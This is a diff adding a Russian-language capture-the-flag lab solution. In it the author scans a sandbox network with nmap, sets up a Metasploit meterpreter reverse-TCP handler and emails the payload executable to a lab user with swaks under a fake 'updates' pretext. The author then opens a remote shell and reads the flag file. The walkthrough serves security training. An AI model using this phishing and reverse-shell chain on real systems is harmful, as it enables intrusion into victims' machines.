@@ -171,5 +171,36 @@ swaks --to mike@sandbox.local --from administrator@sandbox.local --header "Subje
 Логин: Trevis
 Пароль: Qwerty123
 Решение:
+Для начала пришлось настроить сеть меэжду машинами Kali и Windows
+Командой ipconfig в Windows смотрим IP адрес и запоминаем, в Kali я использовал команду ip addr
+Далее с помощью nmap определил устройства в сети: 
+sudo nmap -sn --traceroute 10.0.2.0/24
+Проверил открытые порты:
+sudo nmap -sS 10.0.2.15
+Создал полезную нагрузку.
+Запустил в другом терминале msfconsole:
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.0.2.4
+msf6 exploit(multi/handler) > set LPORT 443
+
+В другом терминале отправил полезную нагрузку:
+
+swaks --to mike@sandbox.local --from administrator@sandbox.local --header "Subject: Updates" --body "Please run this exe file for updates" --server 10.0.2.15 --attach windows-meterpreter-staged-reverse-tcp-443.exe
+
+В терминале, где была запущена msfconsole отрывается сессия в meterpeter, и далее командами нашел флаг на рабочем столе:
+meterpreter > ls - we ended up in C:\Windows\system32
+meterpreter > cd ..
+meterpreter > ls - we ended up in C:\Windows
+meterpreter > cd ..
+meterpreter > ls - we ended up in C:
+meterpreter > cd users
+meterpreter > cd Mike
+meterpreter > cd Desktop
+meterpreter > cat root.txt
+54817fe7049221c92542027300015b60
+
+
+
 
 
